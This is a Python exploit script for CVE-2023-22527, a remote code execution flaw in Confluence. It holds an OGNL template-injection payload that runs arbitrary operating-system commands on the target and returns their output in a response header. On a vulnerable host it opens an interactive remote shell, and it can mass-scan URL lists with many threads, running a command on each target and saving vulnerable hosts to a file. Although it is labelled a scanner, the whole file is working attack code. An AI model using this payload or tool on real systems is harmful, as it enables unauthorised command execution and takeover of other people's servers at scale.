import urllib3
import requests
import argparse

from typing import Tuple
from rich.console import Console
from alive_progress import alive_bar
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from concurrent.futures import ThreadPoolExecutor, as_completed


class Scanner:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        self.console = Console()
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def execute_command(self, command: str = "whoami") -> Tuple[bool, str]:
        url = self.base_url + "/template/aui/text-inline.vm"
        data = (
            r"label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027"
            f"&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({{'{command}'}}))"
        )

        try:
            response = requests.post(
                url,
                headers=self.headers,
                data=data,
                verify=False,
                timeout=10,
                allow_redirects=False,
            )

            if "X-Cmd-Response" in response.headers:
                return True, response.headers["X-Cmd-Response"]
            else:
                return False, "Header 'X-Cmd-Response' not found in the response."
        except requests.RequestException as e:
            return False, f"Request failed: {e}"

    def interactive_shell(self):
        session = PromptSession(InMemoryHistory())
        self.console.print(
            "[bold yellow][!] Shell is ready, please type your commands UwU[/bold yellow]"
        )
        while True:
            try:
                cmd = session.prompt(HTML("<ansired><b>$ </b></ansired>"))
                match cmd.lower():
                    case "exit":
                        break
                    case "clear":
                        self.console.clear()
                    case _:
                        success, response = self.execute_command(cmd)
                        if success:
                            self.console.print(response)
            except KeyboardInterrupt:
                break


def process_url(url: str, output_file: str, scanner_class=Scanner):
    scanner = scanner_class(url)
    success, error_message = scanner.execute_command()

    if success:
        if output_file:
            with open(output_file, "a") as file:
                file.write(url + "\n")
        scanner.console.print(
            f"[bold green][+] {url} is vulnerable - [/bold green][bold yellow]{error_message}[/bold yellow]"
        )


def main():
    parser = argparse.ArgumentParser(
        description="Scan for CVE-2023-22527 vulnerability."
    )
    parser.add_argument(
        "-u", "--url", help="Specify a single URL to scan."
    )
    parser.add_argument(
        "-f", "--file", help="Specify a file path containing a list of URLs."
    )
    parser.add_argument(
        "-t",
        "--threads",
        type=int,
        default=100,
        help="Number of concurrent threads for scanning.",
    )
    parser.add_argument(
        "-o", "--output", help="File path to save vulnerable URLs."
    )

    args = parser.parse_args()

    match args:
        case args if args.url:
            scanner = Scanner(args.url)
            success, error_message = scanner.execute_command()

            if success:
                scanner.console.print(
                    f"[bold green][+] {args.url} is vulnerable - [/bold green][bold yellow]{error_message}[/bold yellow]"
                )
                scanner.interactive_shell()
            else:
                scanner.console.print(
                    f"[bold red][-] {args.url} is not vulnerable - [/bold red][bold yellow]{error_message}[/bold yellow]"
                )

        case args if args.file:
            with open(args.file) as file:
                urls = file.read().splitlines()
                with alive_bar(len(urls), enrich_print=False) as bar:
                    with ThreadPoolExecutor(max_workers=args.threads) as executor:
                        futures = [
                            executor.submit(process_url, url, args.output)
                            for url in urls
                        ]
                        for future in as_completed(futures):
                            future.result()
                            bar()
            if args.output:
                print(f"Vulnerable URLs saved to {args.output}")

        case _:
            parser.print_help()


if __name__ == "__main__":
    main()
